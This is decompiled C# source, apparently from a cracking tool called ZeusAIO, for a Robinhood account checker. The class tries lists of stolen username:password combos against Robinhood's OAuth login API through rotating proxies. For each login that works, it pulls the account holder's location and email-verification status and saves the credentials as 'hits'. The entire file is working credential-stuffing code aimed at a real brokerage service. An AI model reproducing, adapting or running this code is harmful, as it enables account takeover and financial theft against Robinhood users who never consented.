// Decompiled with JetBrains decompiler
// Type: Robinhood.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using ZeusAIO;

namespace Robinhood
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36";
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.AllowAutoRedirect = true;
              httpRequest.AddHeader("origin", "https://robinhood.com");
              httpRequest.AddHeader("referer", "https://robinhood.com/");
              httpRequest.AddHeader("x-robinhood-api-version", "1.411.9");
              string str1 = "{\"grant_type\":\"password\",\"scope\":\"internal\",\"client_id\":\"c82SH0WZOsabOXGP2sxqcj34FxkvfnWRZBKlBjFS\",\"expires_in\":86400,\"device_token\":\"b50a336c-7538-4ee6-9e20-6ba9d46123de\",\"username\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\"}";
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              string source1 = httpRequest.Post("https://api.robinhood.com/oauth2/token/", str1, "application/json").ToString();
              if (!source1.Contains("Unable to log in with provided credentials"))
              {
                if (!source1.Contains("200"))
                {
                  if (source1.Contains("access_token"))
                  {
                    string str2 = Check.Parse(source1, "token\": \"", "\"");
                    httpRequest.AddHeader("authorization", "Bearer " + str2);
                    string source2 = httpRequest.Get("https://api.robinhood.com/user/").ToString();
                    string str3 = Check.Parse(source2, "locality\":\"", "\"");
                    string str4 = Check.Parse(source2, "email_verified\":", ",\"");
                    ++mainmenu.hits;
                    if (mainmenu.p1 == "2")
                      Colorful.Console.WriteLine("[HIT - ROBINHOOD] " + s[0] + ":" + s[1] + " | Location: " + str3 + " | Email Verified: " + str4, Color.Green);
                    Export.AsResult("/Robinhood_hits", s[0] + ":" + s[1] + " | Location: " + str3 + " | Email Verified: " + str4);
                    return false;
                  }
                  break;
                }
                break;
              }
              break;
            }
          }
          catch (Exception ex)
          {
            ++mainmenu.errors;
          }
        }
      }
      return false;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));

    private static string Parse(string source, string left, string right) => source.Split(new string[1]
    {
      left
    }, StringSplitOptions.None)[1].Split(new string[1]
    {
      right
    }, StringSplitOptions.None)[0];
  }
}
